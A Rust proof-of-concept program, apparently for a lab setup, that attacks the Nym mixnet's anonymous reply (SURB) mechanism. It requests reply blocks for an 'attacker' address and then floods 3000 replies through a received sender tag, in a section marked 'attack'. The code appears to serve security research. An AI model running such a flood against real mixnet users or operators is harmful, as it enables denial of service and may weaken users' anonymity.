use futures::{SinkExt, StreamExt};
use nym_client_websocket_requests::{requests::ClientRequest, responses::ServerResponse};
use nym_sphinx::anonymous_replies::requests::{AnonymousSenderTag, RepliableMessage, ReplyMessage};
use nym_sphinx::addressing::clients::Recipient;
use tokio_tungstenite::{
    connect_async, tungstenite::protocol::Message, MaybeTlsStream, WebSocketStream,
};

// async fn send_message_and_get_response(
//     ws_stream: &mut WebSocketStream<MaybeTlsStream<TcpStream>>,
//     req: Vec<u8>,
// ) -> ServerResponse {
//     ws_stream.send(Message::Binary(req)).await.unwrap();
//     let raw_message = ws_stream.next().await.unwrap().unwrap();
//     match raw_message {
//         Message::Binary(bin_payload) => ServerResponse::deserialize(&bin_payload).unwrap(),
//         _ => panic!("received an unexpected response type!"),
//     }
// }

// async fn get_self_address(ws_stream: &mut WebSocketStream<MaybeTlsStream<TcpStream>>) -> Recipient {
//     let self_address_request = ClientRequest::SelfAddress.serialize();
//     let response = send_message_and_get_response(ws_stream, self_address_request).await;

//     match response {
//         ServerResponse::SelfAddress(recipient) => *recipient,
//         _ => panic!("received an unexpected response!"),
//     }
// }

#[tokio::main]
async fn main() {
    let uri = "ws://localhost:1977";
    let (mut ws_stream, _) = connect_async(uri).await.unwrap();
    let raw_message = ws_stream.next().await.unwrap().unwrap();
    let response = match raw_message {
        Message::Binary(response) => ServerResponse::deserialize(&response).unwrap(),
        _ => panic!("unexpected response type"),
    };
    let received = match response {
        ServerResponse::Received(received) => received,
        _ => panic!("unexpected response"),
    };

    let surbs_request = ReplyMessage::new_surb_request_message(
        Recipient::try_from_base58_string(std::fs::read_to_string("/nyx_volume/attacker1_address").unwrap().trim_end()).unwrap(),
        69
    );

    tokio::time::sleep(tokio::time::Duration::from_secs(10)).await;

    let reply_request_to_get_surbs = ClientRequest::Reply {
        sender_tag: received.sender_tag.unwrap(),
        message: surbs_request.into_bytes(),
        connection_id: Some(0)
    };
    println!("sending reply with content of 'dummy_file' over the mix network...");
    ws_stream.send(Message::Binary(reply_request_to_get_surbs.serialize())).await.unwrap();


    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    // attack
    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    
    tokio::time::sleep(tokio::time::Duration::from_secs(120)).await;
    let read_data = std::fs::read("/root/surb_attack/src/dummy_file").unwrap();

    println!("Starting attack!");
    for _ in 0..3000 {
        let reply_request = ClientRequest::Reply {
            sender_tag: received.sender_tag.unwrap(),
            message: read_data.clone(),
            connection_id: Some(0)
        };
        ws_stream.send(Message::Binary(reply_request.serialize())).await.unwrap();
    }

    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    // test to see if i can manually request more surbs (not working!)
    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    // let self_address_request = ClientRequest::SelfAddress.serialize();
    // let my_address = get_self_address(&mut ws_stream).await;

    // let amount: u32 = 99;
    // let surbs_request = ReplyMessage::new_surb_request_message(my_address, amount);
    // let reply_request = ClientRequest::Reply {
    //     sender_tag: received.sender_tag.unwrap(),
    //     message: surbs_request.into_bytes(),
    //     connection_id: Some(0)
    // };
    // ws_stream.send(Message::Binary(reply_request.serialize())).await.unwrap();

    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    // old
    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////


    // while let Some(raw_message) = ws_stream.next().await {
    //     match raw_message {
    //         Ok(Message::Text(txt_msg)) => {
    //             let parsed: serde_json::Value = serde_json::from_str(&txt_msg).unwrap();
    //             println!("Received: {}", parsed);
    //         },
    //         Ok(Message::Binary(bin_msg)) => {
    //             println!("Received binary message: {:?}", bin_msg);
    //             let result = ServerResponse::deserialize(&bin_msg).unwrap();
    //             println!("Received binary message: {:?}", result);
    //         },
    //         Ok(_) => {
    //             println!("Received non-text/binary message");
    //         },
    //         Err(e) => {
    //             eprintln!("Error receiving message: {}", e);
    //             break;
    //         }
    //     }
    // }
}